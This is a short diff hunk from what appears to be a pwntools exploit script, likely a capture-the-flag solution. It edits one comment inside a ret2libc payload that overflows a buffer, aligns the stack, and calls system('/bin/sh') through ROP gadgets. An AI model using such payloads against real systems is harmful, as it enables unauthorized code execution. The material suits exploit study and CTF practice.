@@ -54,7 +54,7 @@ payload2 = flat([
     b"A" * 0x20,                            # [32] Offset that fills the buffer
     b"B" * 0x8,                             # [8]  Overwrite EBP
 
-    rop.ret.address,                        # Extra `ret` for padding. Ubuntu 18.04 requires 16-byte alignment on stack pointer RSP.
+    rop.ret.address,                        # Extra `ret` for padding. Ubuntu 18.04 requires 16-byte alignment on stack pointer RSP (movaps).
     rop.rdi.address,                        # pop rdi ; ret
     p64(next(libc.search(b'/bin/sh'))),     # LOCAL - This if the address of the string: /bin/sh\x00
     p64(libc.symbols['system']),            # LOCAL - This time it sends the address of the function system.
